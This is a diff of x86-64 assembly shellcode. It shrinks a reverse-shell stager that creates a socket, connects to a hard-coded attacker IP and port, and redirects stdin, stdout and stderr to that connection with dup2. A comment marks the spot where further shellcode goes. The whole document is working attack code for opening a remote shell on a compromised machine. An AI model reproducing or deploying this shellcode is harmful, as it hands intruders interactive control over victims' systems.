@@ -24,33 +24,33 @@ BITS 64
 main:
 	
 open_my_socket:
-	push byte AF_INET
-	pop  rdi
-	push byte SOCK_STREAM
-	pop rsi
-	push byte ANY_PROTO
-	pop rdx
-	SYSTEM_CALL(socket)
+	xor edx, edx; ANY_PROTO
+	lea edi, [rdx+AF_INET]
+	lea esi, [rdx+SOCK_STREAM]
+	lea eax, [rdx+socket]
+	syscall
 
 	xchg rax,rdi
 make_sockaddr:
-	push byte 0		;lame part of sockaddr
+	xor edx, edx
+	push rdx		;lame part of sockaddr
 	mov rax, (IP <<32 | PORT <<16 | AF_INET) 
 	push rax		;important part of sockaddr
 	
 	mov rsi,rsp		;struct sockaddr*
-	push 0x10
-	pop rdx			;addrlen
-	;RDI=sockfd
-	SYSTEM_CALL(connect)
+	lea eax, [rdx+connect]
+	mov dl, 0x10
+	syscall
 	;; assume success (RAX=0)
 	
 	
-	push byte 2		;loop count and FD#
-	pop rsi
+	xor eax, eax
+	lea esi, [rax+2]	;loop count and FD#
+
 copy_stdin_out_err:
-	SYSTEM_CALL(dup2)	
-	dec rsi
+	mov al, dup2
+	syscall
+	dec esi
 	jns copy_stdin_out_err
 	
 	;; Any local shellcode here
